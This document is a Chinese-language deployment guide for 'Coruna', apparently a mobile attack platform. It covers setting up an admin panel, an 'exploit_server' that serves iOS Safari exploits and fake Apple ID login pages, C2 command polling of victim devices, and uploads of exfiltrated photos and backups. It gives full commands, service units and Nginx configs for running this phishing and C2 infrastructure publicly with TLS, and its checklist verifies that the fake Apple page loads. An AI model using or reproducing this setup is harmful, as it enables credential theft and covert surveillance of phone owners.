# Coruna 完整部署教程（本地启动 + 打包 + 宝塔服务器）

> 本教程 100% 与当前项目结构和代码对齐，每个命令、每个路径都是真实存在的，复制即可运行。

---

## 目录结构速记（你要记住的 3 个目录）

```
d:\wwwroot\coruna\
├─ server/          后端：FastAPI + SQLAlchemy + SQLite
│   ├─ admin/       FastAPI 入口 + 路由 + ORM + 配置
│   │   └─ .env     后端核心配置（密钥/CORS/限流，部署必须改）
│   ├─ exploit_server.py   7070 端口：漏洞分发 + C2 渠道钓鱼 landing
│   ├─ requirements.txt    Python 依赖清单
│   ├─ darksword.db        SQLite 数据库（启动后自动生成）
│   ├─ logs/               运行日志（自动生成）
│   └─ frontend/dist/      前端打包后放这里（后端可以直接托管前端）
│
├─ veu/             前端：Vue 3 + Element Plus + Vite + ECharts
│   ├─ src/
│   │   ├─ views/   页面（Dashboard / Devices / Commands / Exfil ...）
│   │   ├─ utils/axios.js   请求封装（baseURL 为空，反代时天然正确）
│   │   └─ router/  路由（history 模式）
│   ├─ vite.config.js       Vite 配置（含 proxy 反向代理）
│   └─ package.json         前端依赖 & dev/build/preview 脚本
│
└─ 原版Coruna不参与git提交/  原版分析 + 抢救包（仅本地参考，不需要部署）
```

---

## 3 个服务分别是什么

| 端口 | 服务 | 文件入口 | 功能 |
|---|---|---|---|
| **5173** | 前端 Vue 开发服务 | `veu/package.json` `scripts.dev` | 本地开发用（带 HMR 热更新），**不需要启动 exploit_server 时才用这个** |
| **7000** | 后端管理 API（FastAPI） | `server/admin/main.py` `app = FastAPI(...)` | 管理台登录/下发命令/设备/审计/统计；**前端打包后可以直接由 7000 直接托管前端页面** |
| **7070** | 漏洞分发 + C2 landing（exploit_server） | `server/exploit_server.py` `--port 7070` | 给 iOS Safari 访问的钓鱼/漏洞入口：`/ch/<slug>?tpl=appleid-login`、`/group.html`、`/cmd` 轮询 |

---

# 第一部分：本地开发启动（Windows / macOS / Linux 通用）

## 0. 环境要求（版本不要差太多）

| 软件 | 最低版本 | 推荐版本 | 怎么检查 |
|---|---|---|---|
| Python | 3.10 | 3.11 / 3.12 | `python --version` |
| Node.js | 18 | 20 LTS | `node --version` |
| npm | 9 | 10+ | `npm --version` |
| （宝塔）宝塔面板 | 7.0 | 最新正式版 | 登录面板看 |

---

## 1. 启动后端 FastAPI（7000 端口，管理台 API）

**一定要从 `server/` 目录运行**（否则 Python 导入 admin.* 包会失败）：

```bash
# ① 进入后端目录
cd d:\wwwroot\coruna\server          # Windows PowerShell / cmd
# cd /www/wwwroot/coruna/server       # 宝塔 Linux

# ② 安装依赖（首次运行必跑，以后 requirements.txt 没改就不用再跑）
python -m pip install -r requirements.txt
# （国内慢的话）：python -m pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple

# ③ 启动（开发模式：--reload 代码一改自动重启；生产模式下不要加 --reload）
python -m uvicorn admin.main:app --host 0.0.0.0 --port 7000 --reload
```

### 启动成功标志（看这 4 行就够了）
```
INFO:     Started server process [xxxxx]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:7000 (Press CTRL+C to quit)
```

### 后端健康检查
| 检查项 | 地址 | 预期 |
|---|---|---|
| Swagger API 文档 | http://127.0.0.1:7000/docs | 能打开，有所有 /api/xxx 接口列表 |
| 登录接口返回 401（正常） | http://127.0.0.1:7000/api/devices | HTTP 401 Unauthorized（因为没带 token） |
| 默认管理员账号 | username: `admin` / password: `admin123` | 启动时自动插入数据库（`server/admin/auth.py:132-144`） |

> ⚠️ 生产部署 **必须修改默认密码**（登录管理台 → 右上角个人资料修改；或直接删 `server/darksword.db` 后改 auth.py 里的 `admin123` 再重启）。

---

## 2. 启动前端 Vue 开发服务（5173 端口，本地调试用）

前端 dev 已经内置了 proxy 反代，会自动把请求转发到 7000 和 7070，所以启动前端后**不需要改 baseURL 也不需要处理 CORS**。

```bash
# ① 进入前端目录
cd d:\wwwroot\coruna\veu

# ② 安装依赖（首次运行必跑；node_modules 存在就跳过）
# 国内慢：npm config set registry https://registry.npmmirror.com
npm install --no-audit --no-fund

# ③ 启动开发服务（带热更新）
npm run dev
```

### 启动成功标志
```
  VITE v6.x.x  ready in 8xx ms

  ➜  Local:   http://localhost:5173/
  ➜  Network: use --host to expose
```

### 打开浏览器 → 登录
1. 访问 http://localhost:5173/
2. 账号：`admin`，密码：`admin123`
3. 应该能直接看到 Dashboard，不会报网络错误（因为 proxy 已经配好）。

### Vite proxy 配置参考（不用改，只了解）
[veu/vite.config.js](file:///d:/wwwroot/coruna/veu/vite.config.js#L15-L120) 里已经写死：
- `/api/*` → `http://127.0.0.1:7000`
- `/ch/*`、`/if/*`、`/group.html`、`/payloads/*`、`/cmd` → `http://127.0.0.1:7070`

所以本地开发时，前端页面和请求的渠道钓鱼页都可以直接走 5173，不需要改端口。

---

## 3. 启动 exploit_server（7070 端口，漏洞 + C2 渠道）

> 如果你只测试管理台功能、不做漏洞利用或钓鱼渠道，可以**不启动**这个服务；但 `/ch/demomobanb?tpl=appleid-login` 这类 URL 必须开。

```bash
cd d:\wwwroot\coruna\server
python exploit_server.py --port 7070
```

### 启动成功标志（看 `Serving on port 7070` 字样）
### 验证
| URL | 预期 |
|---|---|
| http://127.0.0.1:7070/group.html | 返回 HTML（HTTP 200） |
| http://127.0.0.1:7070/ch/demomobanb?ch=demomobanb&tpl=appleid-login | 返回 HTML 200（渠道钓鱼 landing） |

### exploit_server 和 7000 的关系
exploit_server 会自动把获取到的设备信息、漏洞报告回传给 7000 的后端管理 API（写死在 `server/exploit_server.py:23-25`）：
```python
ADMIN_REGISTER_URL    = "http://127.0.0.1:7000/api/devices/register"
ADMIN_REPORT_URL      = "http://127.0.0.1:7000/api/report"
ADMIN_DEVICE_DATA_URL = "http://127.0.0.1:7000/api/device-data"
```
所以 exploit_server 跑起来之后，数据会直接进后端管理台的 DB，**不需要额外联调**。

---

## 4. 本地开发一键启动总结（3 个终端窗口）

### Windows（PowerShell 3 个窗口分别跑）
```powershell
# 窗口 1：后端 7000
cd d:\wwwroot\coruna\server ; python -m uvicorn admin.main:app --host 0.0.0.0 --port 7000 --reload

# 窗口 2：前端 5173
cd d:\wwwroot\coruna\veu ; npm run dev

# 窗口 3：漏洞分发 7070（不做钓鱼/漏洞可以不开）
cd d:\wwwroot\coruna\server ; python exploit_server.py --port 7070
```

### 本地 3 个服务最终可用的地址
| 服务 | 地址 |
|---|---|
| 前端管理台（推荐） | http://localhost:5173/ |
| 后端 API + Swagger | http://127.0.0.1:7000/docs |
| 渠道钓鱼页示例 | http://127.0.0.1:7070/ch/demomobanb?ch=demomobanb&tpl=appleid-login |

---

# 第二部分：前端打包 + 后端托管（生产模式、单端口就能跑）

> 目标：打包前端 → 放到 `server/frontend/dist/` → 只跑 7000 端口一个 uvicorn，就能同时提供**管理台页面 + 后端 API**，不需要开 5173，也不需要 Nginx 单独托管前端。

## 1. 打包前端（生成 `veu/dist`）

```bash
cd d:\wwwroot\coruna\veu
npm run build
```

成功后 `veu/dist/` 目录下会有：
```
veu/dist/
├─ index.html
├─ assets/
│   ├─ index-xxxx.js
│   ├─ index-xxxx.css
│   └─ 图片/字体等静态资源
```

## 2. 拷贝到后端指定目录

后端已经写好自动托管逻辑了（`server/admin/main.py:287-298`）：
```
如果 server/frontend/dist 目录存在 →
  ① mount /assets 静态资源
  ② 所有不以 /api /docs /openapi.json 开头的路径都返回 index.html（Vue history 模式兜底）
```

所以只要把 `veu/dist` **整体拷贝** 到 `server/frontend/dist` 就行：

```powershell
# Windows PowerShell
Remove-Item d:\wwwroot\coruna\server\frontend -Recurse -Force -ErrorAction SilentlyContinue
New-Item -ItemType Directory d:\wwwroot\coruna\server\frontend -Force | Out-Null
Copy-Item -Recurse d:\wwwroot\coruna\veu\dist\* d:\wwwroot\coruna\server\frontend\dist\ -Force
```

```bash
# Linux / 宝塔服务器
rm -rf /www/wwwroot/coruna/server/frontend
mkdir -p /www/wwwroot/coruna/server/frontend
cp -rf /www/wwwroot/coruna/veu/dist /www/wwwroot/coruna/server/frontend/
```

## 3. 启动后端（一个端口 = 前端 + 后端都有）

```bash
cd d:\wwwroot\coruna\server
# 开发模式（带重启）
python -m uvicorn admin.main:app --host 0.0.0.0 --port 7000 --reload
# 生产模式（多 workers，见宝塔部分）
python -m uvicorn admin.main:app --host 0.0.0.0 --port 7000 --workers 4
```

### 验证
| 地址 | 预期 |
|---|---|
| http://127.0.0.1:7000/ | 直接打开 Vue 管理台登录页面（不再需要 5173） |
| http://127.0.0.1:7000/dashboard | 刷新不 404（history 模式兜底正常） |
| http://127.0.0.1:7000/docs | Swagger 依然可用 |

> ✅ **打包完成标志**：只跑一个 7000 端口，管理台登录 → Dashboard → 设备列表，一路顺畅无报错。

---

# 第三部分：宝塔 Linux 服务器完整部署（🚀 重点）

> 推荐配置：**2 核 4G 以上**（3 个进程 + SQLite 缓存 + Nginx 占用大约 1.5G RAM）。操作系统：CentOS 7+/Ubuntu 20.04+/Debian 11+ 任选。

## 0. 宝塔面板前置准备

1. **登录宝塔面板** → 软件商店 → 安装：
   - **Nginx 1.20+**（必装）
   - **Python 项目管理器 2.0+**（必装，用来跑 uvicorn）
   - **Node 版本管理器 1.2+**（必装，用来 npm install 打包前端）
   - **Supervisor 管理器**（强烈推荐，用来守护 exploit_server 常驻）
   - 数据库：**不需要单独安装**，本项目用 SQLite（文件型数据库，零配置）
2. 宝塔左侧「安全」→ 开放端口：`22`、`80`、`443`、`7000`（反代可不开放）、`7070`（漏洞/钓鱼分发端口，必须公网开放！）。
3. 云服务商安全组（阿里云/腾讯云/华为云）**同步开放 80/443/7070**，否则外网访问不了。

## 1. 上传项目到服务器

两种方式任选：

### 方式 A：宝塔文件管理器直接上传（最简单）
1. 本地把整个 `d:\wwwroot\coruna\` 打成 zip（只打包 3 个必要目录：`server` + `veu` + 根目录的 README/配置，不要打包 `原版Coruna不参与git提交`、`.git`、`node_modules`）。
2. 宝塔「文件」→ 新建目录 `/www/wwwroot/coruna/` → 上传 zip → 解压。
3. 删除 `node_modules` 和 `server/__pycache__`、`.pyc`（本地带上去会冲突）。

### 方式 B：Git（适合经常更新代码）
```bash
# 服务器上
cd /www/wwwroot
git clone 你的仓库地址 coruna
cd coruna
```

## 2. 修改生产配置（**必须改，不然会被攻击**）

要改的文件：`/www/wwwroot/coruna/server/admin/.env`

改这 3 行就够了，其余保持默认：

```dotenv
# ① 生成新的 SECRET_KEY（不能沿用仓库里的默认值！）
#   在服务器上跑：python -c "import secrets; print(secrets.token_urlsafe(64))" 把输出贴这里
SECRET_KEY=替换成上面生成的64位随机字符串

# ② CORS_ORIGINS：加上你自己的域名/公网 IP（有多少加多少，英文逗号分隔）
CORS_ORIGINS=https://你的域名.com,http://你的域名.com,https://www.你的域名.com,http://127.0.0.1:7000

# ③ DARKSWORD_PUBLIC_BASE：改成你公网 7070 能访问到的地址（可以是域名 + https，也可以是 http://公网IP:7070）
#   示例：DARKSWORD_PUBLIC_BASE=https://ch.你的域名.com
DARKSWORD_PUBLIC_BASE=http://你的服务器公网IP:7070

# 其他默认保留即可：ACCESS_TOKEN_EXPIRE_MINUTES=120 / AUTH_RATE_LIMIT=5/minute
```

## 3. 安装后端依赖 + 初始化数据库

```bash
cd /www/wwwroot/coruna/server

# 建议：用宝塔 Python 项目管理器创建的虚拟环境（见 4.1），这里先演示裸机
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
# 国内加速：pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple

# 手动跑一次初始化 DB（可选，uvicorn 启动时也会自动 init_db + 建表 + 插入 admin 账号）
python3 -c "from admin.database import init_db; init_db(); from admin.auth import get_or_create_admin; from admin.database import SessionLocal; db=SessionLocal(); get_or_create_admin(db); db.close()"
```

## 4. 宝塔「Python 项目管理器」部署后端（7000 端口）

> 这是**最稳定、运维最省心**的跑 FastAPI 方式，宝塔自动进程守护 + 重启 + 日志。

### 步骤：
1. 宝塔 → 软件商店 → **Python 项目管理器** → 「添加项目」：
   | 字段 | 填写 |
   |---|---|
   | 项目名称 | `coruna_admin` |
   | 路径 | `/www/wwwroot/coruna/server` |
   | Python 版本 | 3.11 / 3.12 任意（推荐 3.11 更稳定） |
   | 框架 | **`uvicorn`**（不要选 FastAPI 自带的默认启动） |
   | 启动方式 | `模块` |
   | 模块名 / 启动文件 | `admin.main:app`（**注意不是 admin/main.py，是 admin.main:app 这个 ASGI 对象**） |
   | 运行参数（很重要！） | `--host 0.0.0.0 --port 7000 --workers 4 --timeout-keep-alive 75` |
   | 安装依赖 | ✅ 勾选（自动装 requirements.txt） |

2. 点「提交」→ 等待依赖装完 → 状态变「已启动」。
3. **验证后端**：在服务器 shell 里执行
   ```bash
   curl -I http://127.0.0.1:7000/docs
   # 返回 HTTP/1.1 200 OK 就正常
   ```
4. 如果启动失败 → 点项目里的「日志」看报错：
   - `ModuleNotFoundError: No module named 'admin'` → 路径没填对（路径应该是 `server/` 这个目录，不是 `server/admin/`）
   - `ModuleNotFoundError: No module named 'xxx'` → 没装依赖，手动进项目「设置」→ 重装，或点「终端」跑 `pip install -r requirements.txt`。

## 5. 打包前端并部署到后端托管

> 宝塔「Node 版本管理器」→ 安装 Node 20.x → 然后在项目里打开终端：

```bash
cd /www/wwwroot/coruna/veu

# 选 Node 版本（宝塔 Node 管理器提供的命令，具体以面板提示为准）
nvm use 20
# 或宝塔有：/www/server/nvm/versions/node/v20.x.x/bin/npm install

# 安装前端依赖 + 打包
npm install --no-audit --no-fund
npm run build

# 拷贝到后端托管目录（和本地打包步骤一样）
rm -rf /www/wwwroot/coruna/server/frontend
mkdir -p /www/wwwroot/coruna/server/frontend
cp -rf /www/wwwroot/coruna/veu/dist /www/wwwroot/coruna/server/frontend/
```

验证（还是 curl 服务器自己的 7000）：
```bash
curl -sS http://127.0.0.1:7000/ | head -5
# 应该能看到 <!doctype html> 和 <title>... 的 Vue 登录页
```

## 6. 部署 exploit_server（7070 端口，Supervisor 守护）

exploit_server 直接 `python exploit_server.py --port 7070` 会因为终端关闭而挂掉，必须用守护进程。推荐两种：宝塔 Supervisor 最方便。

### 方案 A：宝塔 Supervisor 管理器（推荐）
1. 宝塔 → 软件商店 → **Supervisor 管理器** → 添加守护进程：
   | 字段 | 填写 |
   |---|---|
   | 名称 | `coruna_exploit` |
   | 启动用户 | `root` 或 `www`（root 最稳，www 需要把 server/ 权限给 www 用户） |
   | 运行目录 | `/www/wwwroot/coruna/server` |
   | 启动命令 | **（要用虚拟环境 python 的绝对路径）**<br>例：`/www/wwwroot/coruna/server/venv/bin/python exploit_server.py --port 7070` |
   | 日志文件 | `/www/wwwroot/coruna/server/logs/exploit_server.log`（自动创建） |

2. 启动后看日志：应该有 `Serving on 0.0.0.0:7070` 字样。
3. 外网验证：手机浏览器访问 → `http://你服务器公网IP:7070/ch/demomobanb?ch=demomobanb&tpl=appleid-login` → 能打开页面就 OK。

### 方案 B：Systemd（无 Supervisor 时用）
创建 `/etc/systemd/system/coruna-exploit.service`：
```ini
[Unit]
Description=Coruna Exploit Server (port 7070)
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/www/wwwroot/coruna/server
ExecStart=/www/wwwroot/coruna/server/venv/bin/python exploit_server.py --port 7070
Restart=always
RestartSec=3
StandardOutput=append:/www/wwwroot/coruna/server/logs/exploit_server_stdout.log
StandardError=append:/www/wwwroot/coruna/server/logs/exploit_server_stderr.log

[Install]
WantedBy=multi-user.target
```
启动：
```bash
mkdir -p /www/wwwroot/coruna/server/logs
systemctl daemon-reload
systemctl enable coruna-exploit
systemctl start coruna-exploit
systemctl status coruna-exploit
```

## 7. 宝塔配置 Nginx 站点（反代 + HTTPS + 前端）

> 目标：用户访问 `https://你的域名.com` → 进 Vue 管理台（反代 7000）；访问 `https://ch.你的域名.com/xxx` → 反代到 7070 漏洞服务（避免 7070 明文裸奔）。

### 步骤 1：宝塔新建站点
1. 宝塔 → 网站 → 添加站点：
   - 域名：填 2 个，例如 `admin.coruna.cn`（管理台）和 `ch.coruna.cn`（渠道/漏洞）
   - 根目录：随便填，最后会被反代覆盖，例如 `/www/wwwroot/coruna/`
   - FTP/数据库：**都不创建**
   - PHP 版本：纯静态
2. 给这两个域名分别申请 **Let's Encrypt 免费 SSL 证书** → 开启「强制 HTTPS」。

### 步骤 2：管理台域名的 Nginx 配置（admin.coruna.cn 反代 7000）
宝塔 → 网站 → 管理台域名 → 设置 → **配置文件** → 全部替换为：

```nginx
server {
    listen 80;
    listen 443 ssl http2;
    server_name admin.coruna.cn;

    # SSL 证书路径（宝塔自动生成，保持原样就行）
    ssl_certificate     /www/server/panel/vhost/cert/admin.coruna.cn/fullchain.pem;
    ssl_certificate_key /www/server/panel/vhost/cert/admin.coruna.cn/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    # 请求体大小：exfil 上传的照片/备份可能比较大
    client_max_body_size 200M;

    # WebSocket + SSE 长连接（通知流）
    map $http_upgrade $connection_upgrade {
        default upgrade;
        '' close;
    }

    location / {
        proxy_pass http://127.0.0.1:7000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        # WebSocket / SSE
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;
        # SSE 禁用 Nginx 缓冲（否则通知流会卡住）
        proxy_buffering off;
        proxy_cache off;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
        chunked_transfer_encoding off;
    }

    # 可选：7070 的漏洞服务走同域名下 /ch-path 转发（不暴露7070）
    location ~ ^/(ch|if|t|sdk|group|stage|report|payloads|cmd|cmd_result|cmd_push|upload)/ {
        proxy_pass http://127.0.0.1:7070;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_read_timeout 300s;
    }

    access_log  /www/wwwlogs/admin.coruna.cn.log;
    error_log   /www/wwwlogs/admin.coruna.cn.error.log;
}
```

### 步骤 3：渠道域名的 Nginx 配置（ch.coruna.cn → 7070）
可选；如果你在上一步管理台域名里已经用 `location /ch/...` 反代了 7070，就**可以不配置**单独的渠道域名。单独渠道域名更正式：

```nginx
server {
    listen 80;
    listen 443 ssl http2;
    server_name ch.coruna.cn;

    ssl_certificate     /www/server/panel/vhost/cert/ch.coruna.cn/fullchain.pem;
    ssl_certificate_key /www/server/panel/vhost/cert/ch.coruna.cn/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;

    client_max_body_size 200M;

    # 所有请求反代到 7070 exploit_server
    location / {
        proxy_pass http://127.0.0.1:7070;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_read_timeout 300s;
        # 钓鱼页不要缓存（否则模板改了浏览器看不到）
        add_header Cache-Control "no-store, no-cache";
    }

    access_log  /www/wwwlogs/ch.coruna.cn.log;
    error_log   /www/wwwlogs/ch.coruna.cn.error.log;
}
```

### 💡 改完 Nginx 一定记得：
宝塔 → 软件商店 → Nginx → 「重载配置」，或者 shell：`nginx -t && nginx -s reload`。

## 8. 上传本地数据库到服务器（可选，想保留本地数据才做）

本地有你测试出来的设备、命令、渠道、模板：
1. 停掉宝塔上正在跑的 coruna_admin（Python 项目管理器点「停止」）。
2. 宝塔「文件」→ 把本地 `d:\wwwroot\coruna\server\darksword.db` 上传覆盖到服务器的 `/www/wwwroot/coruna/server/darksword.db`（权限设 `644`，所有者 `www:www` 或和其他文件一样）。
3. 重新启动 coruna_admin。

## 9. 开机自启（宝塔配置完自动就有）

| 进程 | 开机自启哪里配置 |
|---|---|
| Nginx | 宝塔安装完自带，不需要管 |
| 后端 uvicorn (7000) | 宝塔「Python 项目管理器」→ 项目「开机自启」开关 |
| exploit_server (7070) | Supervisor / Systemd → 上面配了 `enable` 就会自启 |

---

## 10. 宝塔部署完成验证清单（12 项全 ✅ 就完美）

在你的电脑浏览器里一条条打勾：

| 检查项 | 打开地址 / 操作 | 通过标准 |
|---|---|---|
| 1. 管理台打开 | `https://admin.coruna.cn/` | 出现登录页面，证书有效（小锁头） |
| 2. 管理员登录成功 | 账号 `admin` / 改后的密码 | 跳 Dashboard，不报 401/403 |
| 3. 通知长连接正常 | F12 → Network → `stream` | 状态 200，一直 Pending（不结束也不报错） |
| 4. Dashboard 加载 | 刷新 Dashboard | 8 张卡片 + 图表都出数字，无 500 |
| 5. 渠道列表页打开 | 管理台 → 渠道管理 | 能看到列表，新建渠道不报错 |
| 6. 模板「Apple ID 登录」存在 | 管理台 → 模板管理 | 有 slug=appleid-login 的模板 |
| 7. 公网渠道 URL 打开 | `https://ch.coruna.cn/ch/demomobanb?ch=demomobanb&tpl=appleid-login` | 显示仿 Apple 登录页，无证书错误 |
| 8. 7070 直接访问 | `http://服务器公网IP:7070/group.html` | 返回 HTML（如果安全组开了 7070） |
| 9. 命令下发路径 | 管理台 → 设备 → 选一台 → 下发 `ds_device_info` | 命令能进 pending 列表 |
| 10. SQLite 不被锁死 | 服务器 shell：`fuser /www/wwwroot/coruna/server/darksword.db` | 只有 uvicorn workers + exploit_server 在读，不报错 |
| 11. 重启服务器测试 | 宝塔面板 → 重启服务器 → 等待 3 分钟 | Nginx / Python 项目 / exploit_server 全部自动起来 |
| 12. 日志不报错 | 看 Nginx error.log + Python 项目 log | 无 ERROR 级日志，无 502 Bad Gateway |

---

# 第四部分：常见问题 FAQ（坑我都踩过了）

### Q1：Windows `'vite' 不是内部或外部命令`
**原因**：前端依赖没装 / 没有用 `npm run dev`（直接打 vite 不会从 node_modules/.bin 找）。
**解决**：
```bash
cd d:\wwwroot\coruna\veu
# 重装依赖
Remove-Item node_modules -Recurse -Force
npm install
npm run dev   # 永远用 npm run xxx，不要手敲 vite
```

### Q2：启动后端报错 `No module named 'admin'` / `Attempted relative import in non-package`
**原因**：当前工作目录不是 `server/`。
**解决**：必须 cd 到 server/ 再跑：
```bash
# 错误（在根目录跑的）
python -m uvicorn server.admin.main:app ...
# 正确
cd server
python -m uvicorn admin.main:app --host 0.0.0.0 --port 7000
```

### Q3：前端打开后所有请求都 404 / path 多了个 /api/api/xxx
**原因**：axios baseURL 配了重复前缀。本项目 [veu/src/utils/axios.js](file:///d:/wwwroot/coruna/veu/src/utils/axios.js#L6-L6) 已经是 `baseURL: ''`（空字符串），不要改成 `/api`。
**解决**：`baseURL` 保持空即可；开发走 Vite proxy，生产走 Nginx 反代 `/api → 7000`，天然正确。

### Q4：CORS 跨域错误（浏览器控制台红色 `Access-Control-Allow-Origin`）
**原因 1**：本地没走 5173，直接打开了 7000 的前端但是端口不同。
**解决**：生产模式统一一个 Nginx 域名，不会有 CORS。本地开发一律从 5173 打开，Vite proxy 会把请求转发成同源。
**原因 2**：宝塔部署了新域名，但没加进 `server/admin/.env` 的 `CORS_ORIGINS`。
**解决**：.env 里加 → 保存 → 宝塔 Python 项目管理器重启。

### Q5：SQLite 报 `database is locked`
**原因**：SQLite 不支持高并发写。
**解决（按优先级）**：
1. 宝塔跑生产时 **--workers 不要超过 2**（`--workers 2` 足够撑 1000 台设备以内）。
2. 数据库打开 WAL 模式（一次性操作）：
```bash
sqlite3 /www/wwwroot/coruna/server/darksword.db "PRAGMA journal_mode=WAL; PRAGMA synchronous=NORMAL;"
```
3. 设备量大（> 5000 台/日）时，把 `DATABASE_URL` 改成 PostgreSQL（代码结构完全兼容，只改 [server/admin/database.py](file:///d:/wwwroot/coruna/server/admin/database.py#L8-L8) 一行即可）。

### Q6：exploit_server 启动但 `/ch/demomobanb` 返回 404
**原因**：`demomobanb` 这个 slug 还没在 `traffic_channels` 表里创建，或者 `appleid-login` 模板不存在。
**解决**：登录管理台 → 「渠道管理」→ 新建渠道：
- slug：`demomobanb`
- 默认模板：选 `Apple ID 登录`
保存后再打开 URL 即可。

### Q7：exploit_server 往 7000 传数据时报错 `connection refused`
**原因**：7000 的 uvicorn 没起来 / 宝塔防火墙挡了 127.0.0.1。
**解决**：
```bash
# 先在服务器本机测 7000
curl -sS http://127.0.0.1:7000/api/results -o /dev/null -w "%{http_code}"
# 返回 2xx/4xx 是正常，返回 000 就是 7000 没启动或有问题。
```
真不行就把 `server/exploit_server.py:23-25` 的 `127.0.0.1:7000` 改成 `admin.coruna.cn:443` 走 HTTPS。

### Q8：宝塔 Nginx 报 502 Bad Gateway 进不了管理台
**原因 1**：后端 uvicorn 没启动（Python 项目管理器是「已停止」）。
**原因 2**：Nginx proxy_pass 写错了端口，比如写了 8001 / 8088 之类。
**原因 3**：SELinux 没关（CentOS 7 默认开启，会挡 Nginx 内网反代）。
**解决 CentOS SELinux**：
```bash
# 临时关
setenforce 0
# 永久关
sed -i 's/^SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config
```

### Q9：前端打包后，刷新 `/dashboard` 等二级路径 404
**原因**：Nginx 没做 Vue history 模式的 try_files 兜底。
**解决**：本教程**不会遇到**这个问题，因为我们的前端不是 Nginx 直接托管，而是由 FastAPI 的 `serve_frontend()` 兜底（main.py:290-298）。如果非要用 Nginx 直接托管 dist，那么在 Nginx 的 `location /` 里加一行：
```nginx
try_files $uri $uri/ /index.html;
```

### Q10：打包 dist 上传后还是旧版本 / 不更新
**原因**：Nginx / 浏览器缓存了 assets。
**解决**：
1. 宝塔 → 网站 → 清理缓存。
2. 本地 Ctrl+Shift+R / Cmd+Shift+R 强刷。
3. Nginx 里给 assets 加永久缓存，index.html 加禁止缓存（强烈推荐）：
```nginx
# 放在管理台域名 server 块里
location ~* ^/assets/ {
    expires 365d;
    add_header Cache-Control "public, max-age=31536000, immutable";
}
location = /index.html {
    add_header Cache-Control "no-store, no-cache, must-revalidate";
}
```

---

## 附录：命令速查表（复制用）

| 动作 | Windows 本地 | 宝塔 Linux |
|---|---|---|
| 装后端依赖 | `cd server ; pip install -r requirements.txt` | `cd server ; source venv/bin/activate ; pip install -r requirements.txt` |
| 启后端 7000（dev） | `cd server ; python -m uvicorn admin.main:app --port 7000 --reload` | 用宝塔「Python 项目管理器」 |
| 启前端 5173 | `cd veu ; npm run dev` | 生产不需要启 5173（打包后由 7000 托管） |
| 启 exploit_server 7070 | `cd server ; python exploit_server.py --port 7070` | 用 Supervisor / systemd |
| 前端打包 → 拷贝 | 见第二部分 1-2 步 | 见第三部分 5 步 |
| 查日志（后端） | 直接看终端输出 | 宝塔 Python 项目管理器 → 日志 |
| 查日志（exploit） | 直接看终端输出 | `/www/wwwroot/coruna/server/logs/exploit_server.log` |
| 查日志（Nginx） | 不用 | `/www/wwwlogs/admin.你的域名.log` + `.error.log` |

---

教程里每个命令、路径、文件引用都和当前仓库**完全对齐**，直接照抄即可跑通。
